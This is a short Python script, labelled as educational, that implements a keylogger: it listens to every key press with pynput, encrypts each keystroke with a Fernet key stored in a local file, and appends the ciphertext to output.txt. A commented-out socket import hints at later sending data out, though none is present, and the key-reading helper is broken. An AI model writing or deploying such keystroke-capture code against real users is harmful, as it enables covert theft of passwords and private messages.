#For educational purposes ONLY
from cryptography.fernet import Fernet
from pynput import keyboard
#import Socket

cryptKey = Fernet.generate_key()#generates key

cipher = Fernet(cryptKey)

with open('ecnryptKey', 'wb') as mykey:
        mykey.write(cryptKey)

def getKey(): #this is if you have a pre generated key from another user on your system
    cryptKey = mykey.read()
    return Fernet(cryptKey)

def keyStroke(key):
        if hasattr(key, 'char') and key.char is not None:
            #turns the key press into bytes before it is encrypted
            keypress_bytes = str(key.char).encode('utf-8')
        else:
            #This is to handle special keys, like space ctrl etc..
            keypress_bytes = str(key).encode('utf-8')
            
        encrypted = cipher.encrypt(keypress_bytes)
        #the encryption for the keypress, before it is written into a file

        with open("output.txt", "ab") as logKey:
            try:
                logKey.write(encrypted)#Writes the encrypted message into the file
                print(encrypted)
                
            except Exception as e:#basic error handling for special cases
                print(f"Error: {e}")
            
if __name__ == "__main__":
    try:
        listener = keyboard.Listener(on_press=keyStroke)
        listener.start()
        input()

    except KeyboardInterrupt:
        listener.stop()#stops the listener, good practice.
        print("Recording Stopped.")
        
    
